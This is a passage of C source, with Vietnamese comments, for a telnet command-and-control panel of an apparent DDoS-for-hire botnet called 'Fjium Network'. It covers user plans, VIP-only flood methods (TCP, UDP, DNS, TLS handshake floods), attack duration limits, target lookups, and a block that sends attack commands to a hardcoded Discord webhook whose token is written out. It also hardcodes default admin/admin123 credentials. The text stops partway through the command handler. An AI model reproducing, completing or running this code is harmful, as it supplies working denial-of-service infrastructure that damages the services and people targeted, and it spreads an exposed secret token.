#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h> // Thêm thư viện này cho strcasecmp
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <jansson.h>
#include <curl/curl.h>
#include <ctype.h>
#include <errno.h>

// ================================================================= //
// =================== KHỐI MÃ ĐƯỢC THÊM VÀO ======================= //
// ================================================================= //

// URL Webhook cho Discord
const char* WEBHOOK_URL = "https://discord.com/api/webhooks/1403909836374147195/RIinXwYc2Jy0PvoqibWTbEaxVAM-1DPiPYndLbE7hpFr35JQUSql39d7rE1CYIFcxODP";

/**
 * @brief Gửi một payload đến Discord webhook.
 * @param payload Lệnh đã được định dạng để gửi.
 */
void send_to_webhook(const char* payload) {
    CURL *curl;
    CURLcode res;

    // Không gửi nếu URL webhook không được cấu hình
    if (WEBHOOK_URL == NULL || strlen(WEBHOOK_URL) == 0) {
        return;
    }
    
    char json_payload[2048];
    struct curl_slist *headers = NULL;

    // Tạo payload JSON: {"content": "your_payload"}
    snprintf(json_payload, sizeof(json_payload), "{\"content\":\"%s\"}", payload);

    curl = curl_easy_init();
    if (curl) {
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        // Chạy trong một luồng riêng để không làm chậm C2
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Webhook send error: %s\n", curl_easy_strerror(res));
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

/**
 * @brief Phân tích lệnh tấn công và gửi nó đến webhook với định dạng phù hợp.
 * @param parts Mảng các phần của lệnh (method, ip, port, time).
 * @param part_count Số lượng các phần trong lệnh.
 */
void send_attack_to_webhook(char *parts[], int part_count) {
    if (part_count < 4) return;

    char* method = parts[0];
    char* ip = parts[1];
    char* port = parts[2];
    char* time_str = parts[3];

    const char* short_method = NULL;

    // Chuyển đổi tên phương thức đầy đủ thành tên rút gọn
    if (strcasecmp(method, "FJIUM-DNS") == 0) short_method = "dns";
    else if (strcasecmp(method, "FJIUM-HEX") == 0) short_method = "hex";
    else if (strcasecmp(method, "FJIUM-BYPASS") == 0) short_method = "bypass";
    else if (strcasecmp(method, "FJIUM-PPS") == 0) short_method = "pps";
    else if (strcasecmp(method, "FJIUM-GUDP") == 0) short_method = "gudp";
    
    // Nếu là một phương thức hợp lệ, tạo lệnh cuối cùng và gửi đi
    if (short_method) {
        char final_command[1024];
        snprintf(final_command, sizeof(final_command), "./fjium %s %s %s %s", ip, port, time_str, short_method);
        send_to_webhook(final_command);
    }
}

// ================================================================= //
// ==================== KẾT THÚC KHỐI MÃ THÊM ======================= //
// ================================================================= //


// Constants
#define BUF_SIZE 2048
#define MAX_ACCOUNTS 100
#define MAX_MANAGEMENTS 100
#define ONGOING_FILE "ongoing.json"
#define USERS_FILE "users.json"
#define TELNET_PORT 23
#define PAPING_PORT 80
#define COMMAND_COOLDOWN 70 // Tăng độ trễ lên 70 giây
#define MAX_COMMANDS_PER_SESSION 10 // Giới hạn số lệnh mỗi phiên

// Global variables
int OperatorsConnected = 0;
pthread_mutex_t ongoing_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t online_users_lock = PTHREAD_MUTEX_INITIALIZER;
int ongoing_count = 0;
char *userNames[MAX_MANAGEMENTS];
char *userDates[MAX_MANAGEMENTS];
int managements[MAX_MANAGEMENTS];
char *current_user = NULL;
char *user_plan = NULL;

// Structs
typedef struct {
    char username[50];
    char password[50];
    char plan[20];
    char expiry[20];
} Account;

typedef struct {
    char method[50];
    char ip[100];
    int port;
    int duration;
} attack_task;

Account accounts[MAX_ACCOUNTS];
int accountCount = 0;

// Simplified banner
const char *bannerLines[] = {
    "\033[1;34mWelcome To Fjium Network\033[0m\r\n",
    "\033[1;34mType [Help]\033[0m\r\n",
    NULL
};

// API interaction
struct string {
    char *ptr;
    size_t len;
};

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(s->len + 1);
    if (s->ptr) s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t new_len = s->len + size * nmemb;
    char *new_ptr = realloc(s->ptr, new_len + 1);
    if (!new_ptr) {
        free(s->ptr);
        s->ptr = NULL;
        return 0;
    }
    s->ptr = new_ptr;
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->len = new_len;
    s->ptr[new_len] = '\0';
    return size * nmemb;
}

// Utility functions
void trim(char *str) {
    char *end;
    if (!str) return;
    end = str + strlen(str) - 1;
    while (end > str && isspace((unsigned char)*end)) end--;
    end[1] = '\0';
    while (*str && isspace((unsigned char)*str)) str++;
}


int telnet_write(int sock, const char *data, size_t size) {
    ssize_t sent = 0;
    size_t total = 0;
    while (total < size) {
        sent = send(sock, data + total, size - total, MSG_NOSIGNAL);
        if (sent <= 0) return -1;
        total += sent;
    }
    return 0;
}

ssize_t read_line(int sock, char *buf, size_t size) {
    ssize_t n = 0;
    unsigned char c;
    memset(buf, 0, size);
    while (n < size - 1) {
        ssize_t rc = recv(sock, &c, 1, 0);
        if (rc <= 0) return rc;
        if (c >= 32 && c < 127) {
            send(sock, &c, 1, MSG_NOSIGNAL);
        }
        if (c == 127 || c == 8) {
            if (n > 0) {
                n--;
                telnet_write(sock, "\b \b", 3);
            }
            continue;
        }
        if (c == 255) {
            unsigned char cmd, opt;
            recv(sock, &cmd, 1, 0);
            if (cmd >= 251 && cmd <= 254) {
                recv(sock, &opt, 1, 0);
            }
            continue;
        }
        if (c == '\r' || c == '\n') {
            telnet_write(sock, "\r\n", 2);
            if (c == '\r') {
                recv(sock, &c, 1, MSG_PEEK);
                if (c == '\n') recv(sock, &c, 1, 0);
            }
            break;
        }
        buf[n++] = c;
    }
    buf[n] = '\0';
    return n;
}

ssize_t read_password(int sock, char *buf, size_t size) {
    ssize_t n = 0;
    unsigned char c;
    memset(buf, 0, size);
    while (n < size - 1) {
        ssize_t rc = recv(sock, &c, 1, 0);
        if (rc <= 0) return rc;
        if (c == 255) {
            unsigned char cmd, opt;
            recv(sock, &cmd, 1, 0);
            if (cmd >= 251 && cmd <= 254) {
                recv(sock, &opt, 1, 0);
            }
            continue;
        }
        if (c == '\r' || c == '\n') {
            telnet_write(sock, "\r\n", 2);
            if (c == '\r') {
                recv(sock, &c, 1, MSG_PEEK);
                if (c == '\n') recv(sock, &c, 1, 0);
            }
            break;
        }
        if (c == 127 || c == 8) {
            continue;
        }
        if (c >= 32 && c < 127) {
            send(sock, "*", 1, MSG_NOSIGNAL);
        }
        buf[n++] = c;
    }
    buf[n] = '\0';
    return n;
}

void ensure_default_admin() {
    FILE *fp = fopen(USERS_FILE, "r");
    if (!fp) {
        fp = fopen(USERS_FILE, "w");
        if (!fp) return;
        json_t *root = json_object();
        json_t *users = json_array();
        json_t *admin = json_object();
        json_object_set_new(admin, "username", json_string("admin"));
        json_object_set_new(admin, "password", json_string("admin123"));
        json_object_set_new(admin, "plan", json_string("vip"));
        json_object_set_new(admin, "expiry", json_string("2040-12-31"));
        json_array_append_new(users, admin);
        json_object_set_new(root, "users", users);
        json_dumpf(root, fp, JSON_INDENT(4));
        json_decref(root);
        fclose(fp);
    } else {
        fclose(fp);
    }
}

void load_accounts() {
    FILE *fp = fopen(USERS_FILE, "r");
    json_t *root, *users, *user;
    json_error_t error;
    char *buffer;
    long size;
    int i; 

    if (!fp) return;
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = malloc(size + 1);
    if (!buffer) {
        fclose(fp);
        return;
    }
    fread(buffer, 1, size, fp);
    buffer[size] = '\0';
    fclose(fp);

    root = json_loads(buffer, 0, &error);
    free(buffer);
    if (!root) return;

    users = json_object_get(root, "users");
    if (!users) {
        json_decref(root);
        return;
    }

    accountCount = json_array_size(users);
    for (i = 0; i < accountCount && i < MAX_ACCOUNTS; i++) { 
        user = json_array_get(users, i);
        const char *username = json_string_value(json_object_get(user, "username"));
        const char *password = json_string_value(json_object_get(user, "password"));
        const char *plan = json_string_value(json_object_get(user, "plan"));
        const char *expiry = json_string_value(json_object_get(user, "expiry"));
        if (username) strncpy(accounts[i].username, username, 49);
        accounts[i].username[49] = '\0';
        if (password) strncpy(accounts[i].password, password, 49);
        accounts[i].password[49] = '\0';
        if (plan) strncpy(accounts[i].plan, plan, 19);
        accounts[i].plan[19] = '\0';
        if (expiry) strncpy(accounts[i].expiry, expiry, 19);
        accounts[i].expiry[19] = '\0';
    }
    json_decref(root);
}

int is_account_expired(const char *expiry_date) {
    struct tm expiry = {0}, now_tm = {0};
    time_t t = time(NULL);
    localtime_r(&t, &now_tm);
    sscanf(expiry_date, "%d-%d-%d", &expiry.tm_year, &expiry.tm_mon, &expiry.tm_mday);
    expiry.tm_year -= 1900;
    expiry.tm_mon -= 1;
    time_t expiry_time = mktime(&expiry);
    return difftime(t, expiry_time) > 0;
}

int days_until_expiry(const char *expiry_date) {
    struct tm expiry = {0};
    time_t t = time(NULL);
    sscanf(expiry_date, "%d-%d-%d", &expiry.tm_year, &expiry.tm_mon, &expiry.tm_mday);
    expiry.tm_year -= 1900;
    expiry.tm_mon -= 1;
    time_t expiry_time = mktime(&expiry);
    double diff = difftime(expiry_time, t);
    return diff > 0 ? (int)(diff / (24 * 3600)) : 0;
}

int paping(const char *ip, char *response, size_t response_size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    struct timeval timeout;

    if (sock < 0) {
        snprintf(response, response_size, "\033[31m✗ Failure\033[0m: Socket creation failed");
        return 0;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PAPING_PORT);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        snprintf(response, response_size, "\033[31m✗ Failure\033[0m: Invalid IP address");
        close(sock);
        return 0;
    }

    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        snprintf(response, response_size, "\033[31m✗ Failure\033[0m: Connection failed (%s)", strerror(errno));
        close(sock);
        return 0;
    }

    snprintf(response, response_size, "\033[32m✓ Success\033[0m: Connected to %s:%d", ip, PAPING_PORT);
    close(sock);
    return 1;
}

int lookup_ip_info(const char *ip, char *isp, char *asn, char *scr, size_t isp_size, size_t asn_size, size_t scr_size) {
    CURL *curl = curl_easy_init();
    struct string s;
    char url[512];
    CURLcode res;
    long http_code = 0;
    int success = 0;

    if (!curl) {
        strncpy(isp, "\033[31m✗\033[0m", isp_size);
        strncpy(asn, "\033[31m✗\033[0m", asn_size);
        strncpy(scr, "\033[31m✗\033[0m", scr_size);
        return 0;
    }

    init_string(&s);
    if (!s.ptr) {
        curl_easy_cleanup(curl);
        strncpy(isp, "\033[31m✗\033[0m", isp_size);
        strncpy(asn, "\033[31m✗\033[0m", asn_size);
        strncpy(scr, "\033[31m✗\033[0m", scr_size);
        return 0;
    }

    snprintf(url, sizeof(url), "https://ipinfo.io/%s/json", ip);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Fjium-CNC/1.0");

    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (res == CURLE_OK && s.ptr && http_code == 200) {
        json_error_t error;
        json_t *root = json_loads(s.ptr, 0, &error);
        if (root) {
            const char *org = json_string_value(json_object_get(root, "org"));
            const char *asn_str = org; 
            const char *country_code = json_string_value(json_object_get(root, "country"));

            if (org && strlen(org) > 0) {
                snprintf(isp, isp_size, "\033[34m%s\033[0m", org);
            } else {
                strncpy(isp, "\033[31m✗\033[0m", isp_size);
            }

            if (asn_str && strlen(asn_str) > 0) {
                snprintf(asn, asn_size, "\033[34m%s\033[0m", asn_str);
            } else {
                strncpy(asn, "\033[31m✗\033[0m", asn_size);
            }

            if (country_code && strlen(country_code) > 0) {
                snprintf(scr, scr_size, "\033[34m%s\033[0m", country_code);
            } else {
                strncpy(scr, "\033[31m✗\033[0m", scr_size);
            }

            success = (org || asn_str || country_code) ? 1 : 0;
            json_decref(root);
        } else {
            strncpy(isp, "\033[31m✗\033[0m", isp_size);
            strncpy(asn, "\033[31m✗\033[0m", asn_size);
            strncpy(scr, "\033[31m✗\033[0m", scr_size);
        }
    } else {
        strncpy(isp, "\033[31m✗\033[0m", isp_size);
        strncpy(asn, "\033[31m✗\033[0m", asn_size);
        strncpy(scr, "\033[31m✗\033[0m", scr_size);
    }

    free(s.ptr);
    curl_easy_cleanup(curl);
    return success;
}

void *run_attack_task(void *arg) {
    attack_task *task = (attack_task *)arg;
    FILE *fp;
    json_t *root, *tasks, *task_json;
    
    if (!task) return NULL;

    pthread_mutex_lock(&ongoing_lock);
    ongoing_count++;
    pthread_mutex_unlock(&ongoing_lock);


    fp = fopen(ONGOING_FILE, "r");
    if (!fp) {
        root = json_object();
    } else {
        fseek(fp, 0, SEEK_END);
        long size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        if (size > 0) {
            char *buffer = malloc(size + 1);
            if (buffer) {
                fread(buffer, 1, size, fp);
                buffer[size] = '\0';
                json_error_t error;
                root = json_loads(buffer, 0, &error);
                free(buffer);
                if (!root) root = json_object();
            } else {
                root = json_object();
            }
        } else {
            root = json_object();
        }
        fclose(fp);
    }

    tasks = json_object_get(root, "tasks");
    if (!tasks) {
        tasks = json_array();
        json_object_set_new(root, "tasks", tasks);
    }

    task_json = json_object();
    json_object_set_new(task_json, "username", json_string(current_user ? current_user : "unknown"));
    json_object_set_new(task_json, "method", json_string(task->method));
    json_object_set_new(task_json, "url", json_string(task->ip));
    json_object_set_new(task_json, "port", json_integer(task->port));
    json_object_set_new(task_json, "length", json_integer(task->duration));
    json_object_set_new(task_json, "end_time", json_real(time(NULL) + task->duration));

    json_array_append_new(tasks, task_json);

    fp = fopen(ONGOING_FILE, "w");
    if (fp) {
        json_dumpf(root, fp, JSON_INDENT(4));
        fclose(fp);
    }
    json_decref(root);

    sleep(task->duration);

    pthread_mutex_lock(&ongoing_lock);
    ongoing_count--;
    pthread_mutex_unlock(&ongoing_lock);

    free(task);
    return NULL;
}

void execute_attack_command(int datafd, const char *cmd, char *parts[], int part_count) {
    char *url;
    int port, duration, max_time, i; 
    const char *vip_methods[] = {"fjium-pps", "fjium-bypass", "fjium-hex"};
    attack_task *task;
    pthread_t thread;
    char status[100]; 
    time_t now;
    struct tm *tm_info;
    char sent_time[20];
    char isp[100], asn[50], scr[50];
    char details[BUF_SIZE];
    char msg[BUF_SIZE];

    if (part_count < 4) {
        snprintf(msg, sizeof(msg), "Usage: ./bot <%s> <port> <duration>\r\n", cmd);
        telnet_write(datafd, msg, strlen(msg));
        return;
    }

    url = parts[1];
    port = atoi(parts[2]);
    duration = atoi(parts[3]);
    if (port <= 0 || duration <= 0) {
        telnet_write(datafd, "Invalid port or duration.\r\n", 27);
        return;
    }

    max_time = (user_plan && strcmp(user_plan, "vip") == 0) ? 300 : 120;
    if (duration > max_time) {
        snprintf(msg, sizeof(msg), "\033[31m[!] Maximum duration for %s plan is %ds!\033[0m\r\n", user_plan, max_time);
        telnet_write(datafd, msg, strlen(msg));
        return;
    }

    for (i = 0; i < 3; i++) { 
        if (strcmp(cmd, vip_methods[i]) == 0 && (!user_plan || strcmp(user_plan, "vip") != 0)) {
            snprintf(msg, sizeof(msg), "\033[31m[!] Method %s only for VIP users!\033[0m\r\n", cmd);
            telnet_write(datafd, msg, strlen(msg));
            return;
        }
    }

    task = malloc(sizeof(attack_task));
    if (!task) {
        telnet_write(datafd, "Memory allocation error.\r\n", 26);
        return;
    }

    strncpy(task->method, cmd, sizeof(task->method) - 1);
    task->method[sizeof(task->method) - 1] = '\0';
    strncpy(task->ip, url, sizeof(task->ip) - 1);
    task->ip[sizeof(task->ip) - 1] = '\0';
    task->port = port;
    task->duration = duration;

    if (pthread_create(&thread, NULL, run_attack_task, task) != 0) {
        free(task);
        telnet_write(datafd, "Failed to start attack thread.\r\n", 32);
        return;
    }
    pthread_detach(thread);

    
    snprintf(status, sizeof(status), "\033[32m✓ Attack Sent\033[0m");

    now = time(NULL);
    tm_info = localtime(&now);
    strftime(sent_time, sizeof(sent_time), "%Y-%m-%d %H:%M:%S", tm_info);

    lookup_ip_info(url, isp, asn, scr, sizeof(isp), sizeof(asn), sizeof(scr));

    snprintf(details, sizeof(details),
             " Attack Details:\r\n"
             "  │ Status:     [ %s ]\r\n"
             "  │ Host:       [ \033[35m%s\033[0m ]\r\n"
             "  │ Port:       [ \033[34m%d\033[0m ]\r\n"
             "  │ Time:       [ \033[34m%d\033[0m ]\r\n"
             "  │ Method:     [ \033[34m%s\033[0m ]\r\n"
             "  │ Sent Time:  [ \033[34m%s\033[0m ]\r\n"
             " Target Details:\r\n"
             "  │ ISP:        [ %s ]\r\n"
             "  │ ASN:        [ %s ]\r\n"
             "  │ SCR:        [ %s ]\r\n"
             "  │ SERVER:     [ %s ]\r\n",
             status, url, port, duration, cmd, sent_time, isp, asn, scr, status);
    telnet_write(datafd, details, strlen(details));
}

void *title_writer(void *sock) {
    int datafd = (int)(intptr_t)sock;
    const char *spinner = "|/-\\";
    const char *main_title = "Fjium Network";
    int i = 1;
    while (managements[datafd]) {
        char title[BUF_SIZE];
        snprintf(title, sizeof(title), "[%c] %.*s / Welcome, %s / Plan: %s / Running: %d / Ongoing: %d / Expiry: %s",
                 spinner[i % 4], (int)(i % strlen(main_title) + 1), main_title,
                 userNames[datafd], user_plan ? user_plan : "Unknown", OperatorsConnected, ongoing_count, userDates[datafd]);
        telnet_write(datafd, "\033]0;", 4);
        telnet_write(datafd, title, strlen(title));
        telnet_write(datafd, "\007", 1);
        i++;
        sleep(1);
    }
    return NULL;
}

void negotiate_telnet(int sock) {
    unsigned char will_echo[] = {255, 251, 1};
    telnet_write(sock, (char*)will_echo, 3);
    unsigned char will_sga[] = {255, 251, 3};
    telnet_write(sock, (char*)will_sga, 3);
    unsigned char wont_linemode[] = {255, 252, 34};
    telnet_write(sock, (char*)wont_linemode, 3);
    unsigned char dont_naws[] = {255, 254, 31};
    telnet_write(sock, (char*)dont_naws, 3);
}

void *telnet_worker(void *sock) {
    int datafd = (int)(intptr_t)sock;
    pthread_t title;
    char buf[BUF_SIZE];
    int foundIndex = -1;
    int login_attempts = 0;
    const int MAX_LOGIN_ATTEMPTS = 3;
    int i;
    time_t last_attack_time = 0;
    int commands_sent = 0; // Theo dõi số lệnh đã gửi

    pthread_mutex_lock(&online_users_lock);
    OperatorsConnected++;
    pthread_mutex_unlock(&online_users_lock);

    ensure_default_admin();
    load_accounts();

    negotiate_telnet(datafd);
    usleep(100000);
    
    telnet_write(datafd, "\033[2J\033[1;1H", strlen("\033[2J\033[1;1H"));
    telnet_write(datafd, "\033[1;34m=== Fjium Network Login ===\033[0m\r\n\r\n", strlen("\033[1;34m=== Fjium Network Login ===\033[0m\r\n\r\n"));

    while (login_attempts < MAX_LOGIN_ATTEMPTS) {
        telnet_write(datafd, "Username: ", 10);
        if (read_line(datafd, buf, sizeof(buf)) <= 0) {
            goto end;
        }
        trim(buf);
        if (strlen(buf) == 0) {
            login_attempts++;
            continue;
        }
        foundIndex = -1;
        for (i = 0; i < accountCount; i++) {
            if (strcmp(buf, accounts[i].username) == 0) {
                foundIndex = i;
                break;
            }
        }
        if (foundIndex == -1) {
            telnet_write(datafd, "\033[31mInvalid username.\033[0m\r\n\r\n", 32);
            login_attempts++;
            continue;
        }
        telnet_write(datafd, "Password: ", 10);
        if (read_password(datafd, buf, sizeof(buf)) <= 0) {
            goto end;
        }
        trim(buf);
        if (strcmp(buf, accounts[foundIndex].password) != 0) {
            telnet_write(datafd, "\033[31mInvalid password.\033[0m\r\n\r\n", 32);
            login_attempts++;
            continue;
        }
        if (is_account_expired(accounts[foundIndex].expiry)) {
            telnet_write(datafd, "\033[31mYour account has expired.\033[0m\r\n", 37);
            goto end;
        }
        break;
    }

    if (login_attempts >= MAX_LOGIN_ATTEMPTS) {
        telnet_write(datafd, "\033[31mToo many failed login attempts. Goodbye.\033[0m\r\n", 53);
        goto end;
    }

    pthread_mutex_lock(&online_users_lock);
    current_user = strdup(accounts[foundIndex].username);
    user_plan = strdup(accounts[foundIndex].plan);
    strncpy(userNames[datafd], accounts[foundIndex].username, 49);
    userNames[datafd][49] = '\0';
    strncpy(userDates[datafd], accounts[foundIndex].expiry, 19);
    userDates[datafd][19] = '\0';
    managements[datafd] = 1;
    pthread_mutex_unlock(&online_users_lock);

    telnet_write(datafd, "\033[2J\033[1;1H", strlen("\033[2J\033[1;1H"));
    for (i = 0; bannerLines[i]; i++) {
        telnet_write(datafd, bannerLines[i], strlen(bannerLines[i]));
    }

    if (pthread_create(&title, NULL, title_writer, sock) != 0) {
        goto end;
    }
    pthread_detach(title);

    while (1) {
        char prompt[BUF_SIZE];
        char *parts[10];
        int part_count = 0;
        char *token;
        char cmd_lower[50];
        int command_recognized = 0;

        snprintf(prompt, sizeof(prompt), "\033[1;34m%s@FjiumNetwork:~# \033[0m", userNames[datafd]);
        if (telnet_write(datafd, prompt, strlen(prompt)) < 0) {
            break;
        }
        memset(buf, 0, sizeof(buf));
        if (read_line(datafd, buf, sizeof(buf)) <= 0) {
            break;
        }
        trim(buf);
        if (strlen(buf) == 0) continue;

        
        char temp_buf[BUF_SIZE];
        strncpy(temp_buf, buf, sizeof(temp_buf)-1);
        temp_buf[sizeof(temp_buf)-1] = '\0';

        token = strtok(temp_buf, " ");
        while (token && part_count < 10) {
            parts[part_count++] = token;
            token = strtok(NULL, " ");
        }

        if (part_count == 0) continue;

        strncpy(cmd_lower, parts[0], sizeof(cmd_lower) - 1);
        cmd_lower[sizeof(cmd_lower) - 1] = '\0';
        for (i = 0; cmd_lower[i]; i++) {
            cmd_lower[i] = tolower(cmd_lower[i]);
        }

        if (strcmp(cmd_lower, "exit") == 0 || strcmp(cmd_lower, "quit") == 0) {
            telnet_write(datafd, "\033[1;34mGoodbye!\033[0m\r\n", 20);
            command_recognized = 1;
            break;
        } else if (strcmp(cmd_lower, "help") == 0 || strcmp(cmd_lower, "?") == 0) {
            const char *help_msg =
                "\033[1;34m[ Help ]\033[0m\r\n"
                "  │  Help         [\033[1;32mCOMMAND\033[0m] Show list of command.\r\n"
                "  │  Methods      [\033[1;32mCOMMAND\033[0m] Show list of attack methods.\r\n"
                "  │  Ongoing      [\033[1;32mCOMMAND\033[0m] Show attack target.\r\n"
                "  │  Paping       [\033[1;32mCOMMAND\033[0m] Check IP Target.\r\n"
                "  │  Plan         [\033[1;32mCOMMAND\033[0m] View your plan details.\r\n"
                "  │  Clear        [\033[1;32mCOMMAND\033[0m] Clear screen.\r\n"
                "  │  Exit         [\033[1;32mCOMMAND\033[0m] Exit the C2 panel.\r\n";
            telnet_write(datafd, help_msg, strlen(help_msg));
            command_recognized = 1;
        } else if (strcmp(cmd_lower, "clear") == 0 || strcmp(cmd_lower, "cls") == 0) {
            telnet_write(datafd, "\033[2J\033[1;1H", strlen("\033[2J\033[1;1H"));
            for (i = 0; bannerLines[i]; i++) {
                telnet_write(datafd, bannerLines[i], strlen(bannerLines[i]));
            }
            command_recognized = 1;
        } else if (strcmp(cmd_lower, "methods") == 0 || strcmp(cmd_lower, "meth") == 0) {
            const char *methods_msg =
                "\033[1;34m[ Layer 4 Methods ]\033[0m \033[1;33mO\033[0m = VIP User Only\r\n"
                "  │  FJIUM-BYPASS     [\033[1;32mPROTECTED\033[0m] Rust Bypass flood Overload server with TCP.       \033[1;33mO\033[0m\r\n"
                "  │  FJIUM-HEX        [\033[1;32mPROTECTED\033[0m] Rust Hex flood bandwidth with UDP packet.         \033[1;33mO\033[0m\r\n"
                "  │  FJIUM-DNS        [\033[1;32mPROTECTED\033[0m] Rust Dns flood targeting resolvers high requests. \033[1;33mO\033[0m\r\n"
                "  │  FJIUM-GUDP       [\033[1;32mPROTECTED\033[0m] Rust Gudp flood - half-open TCP attack.           \033[1;33mO\033[0m\r\n"
                "  │  FJIUM-PPS        [\033[1;32mPROTECTED\033[0m] Rust PPS flood - bypass some firewalls.           \033[1;33mO\033[0m\r\n"
                "\033[1;34m[ Layer 7 Methods ]\033[0m \033[1;33mO\033[0m = VIP User Only\r\n"
                "  │  FJIUM-RAW        [\033[1;32mPROTECTED\033[0m] Rust Raw spam TLS handshakes to drain CPU.        \033[1;33mO\033[0m\r\n";
            telnet_write(datafd, methods_msg, strlen(methods_msg));
            command_recognized = 1;
        } else if (strcmp(cmd_lower, "plan") == 0) {
            char plan_msg[BUF_SIZE];
            int is_vip = (user_plan && strcmp(user_plan, "vip") == 0);
            int max_time = is_vip ? 300 : 120;
            int days_left = days_until_expiry(userDates[datafd]);
            snprintf(plan_msg, sizeof(plan_msg),
                     "\033[1;34m[ Plan Information ]\033[0m\r\n"
                     "   │ \033[1;37mUsername\033[1;36m:                [\033[1;31m%s\033[0m]\r\n"
                     "   │ \033[1;37mPlan Type\033[1;36m:               [\033[1;%dm%s\033[0m]\r\n"
                     "   │ \033[1;37mMax Attack Time\033[1;36m:         [\033[1;36m%d seconds\033[0m]\r\n"
                     "   │ \033[1;37mConcurrents\033[1;36m:             [\033[1;36m100\033[0m]\r\n"
                     "   │ \033[1;37mTotal Attack Count\033[1;36m:      [\033[1;35mUnlimited\033[0m]\r\n"
                     "   │ \033[1;37mOngoing Attack Count\033[1;36m:    [\033[1;35m%d\033[0m]\r\n"
                     "   │ \033[1;37mVIP Status\033[1;36m:              [\033[1;%dm%s\033[0m]\r\n"
                     "   │ \033[1;37mDays Till Expiry\033[1;36m:        [\033[1;33m%d days\033[0m]\r\n"
                     "   │ \033[1;37mPlan Expiry Date\033[1;36m:        [\033[1;33m%s\033[0m\r\n",
                     userNames[datafd], is_vip ? 32 : 33, user_plan, max_time, ongoing_count,
                     is_vip ? 32 : 31, is_vip ? "True" : "False", days_left, userDates[datafd]);
            telnet_write(datafd, plan_msg, strlen(plan_msg));
            command_recognized = 1;
        } else if (strcmp(cmd_lower, "ongoing") == 0) {
            FILE *fp = fopen(ONGOING_FILE, "r");
            if (!fp) {
                telnet_write(datafd, "No ongoing attacks.\r\n", 21);
            } else {
                fseek(fp, 0, SEEK_END);
                long size = ftell(fp);
                fseek(fp, 0, SEEK_SET);
                if (size == 0) {
                    telnet_write(datafd, "No ongoing attacks.\r\n", 21);
                } else {
                    char *buffer = malloc(size + 1);
                    if (!buffer) {
                        telnet_write(datafd, "Memory error.\r\n", 15);
                    } else {
                        fread(buffer, 1, size, fp);
                        buffer[size] = '\0';
                        json_error_t error;
                        json_t *root = json_loads(buffer, 0, &error);
                        free(buffer);
                        if (!root) {
                            telnet_write(datafd, "Error parsing ongoing file.\r\n", 29);
                        } else {
                            json_t *tasks = json_object_get(root, "tasks");
                            if (!tasks || !json_is_array(tasks) || json_array_size(tasks) == 0) {
                                telnet_write(datafd, "No ongoing attacks.\r\n", 21);
                            } else {
                                telnet_write(datafd, "\033[1;34m[ Ongoing Attacks ]\033[0m\r\n", 32);
                                time_t now = time(NULL);
                                size_t j;
                                for (j = 0; j < json_array_size(tasks); j++) {
                                    json_t *task = json_array_get(tasks, j);
                                    const char *username = json_string_value(json_object_get(task, "username"));
                                    const char *method = json_string_value(json_object_get(task, "method"));
                                    const char *url = json_string_value(json_object_get(task, "url"));
                                    int port = json_integer_value(json_object_get(task, "port"));
                                    int length = json_integer_value(json_object_get(task, "length"));
                                    double end_time = json_real_value(json_object_get(task, "end_time"));
                                    int remaining = (int)(end_time - now);
                                    if (remaining > 0) {
                                        char task_info[BUF_SIZE];
                                        snprintf(task_info, sizeof(task_info),
                                                 "  │ \033[1;37mUser\033[1;36m: \033[0;32m%s\033[0m | \033[1;37mMethod\033[1;36m: \033[0;33m%s\033[0m | \033[1;37mTarget\033[1;36m: \033[0;35m%s:%d\033[0m | \033[1;37mTime\033[1;36m: \033[0;36m%d\033[0m | \033[1;37mRemaining\033[1;36m: \033[0;31m%ds\033[0m\r\n",
                                                 username, method, url, port, length, remaining);
                                        telnet_write(datafd, task_info, strlen(task_info));
                                    }
                                }
                            }
                            json_decref(root);
                        }
                    }
                }
                fclose(fp);
            }
            command_recognized = 1;
        } else if (strcmp(cmd_lower, "paping") == 0) {
            if (part_count < 2) {
                telnet_write(datafd, "Usage: paping <ip>\r\n", 20);
            } else {
                char response[BUF_SIZE];
                char msg[BUF_SIZE];
                paping(parts[1], response, sizeof(response));
                snprintf(msg, sizeof(msg), "%s\r\n", response);
                telnet_write(datafd, msg, strlen(msg));
            }
            command_recognized = 1;
        
        } else if (part_count >= 4) {
            // Anti-spam logic - kiểm tra thời gian chờ
            time_t current_time = time(NULL);
            if (current_time - last_attack_time < COMMAND_COOLDOWN) {
                char cooldown_msg[100];
                snprintf(cooldown_msg, sizeof(cooldown_msg), 
                         "\033[31m[!] Anti-Spam: Vui lòng đợi %ld giây trước khi gửi lệnh tiếp theo.\033[0m\r\n", 
                         COMMAND_COOLDOWN - (current_time - last_attack_time));
                telnet_write(datafd, cooldown_msg, strlen(cooldown_msg));
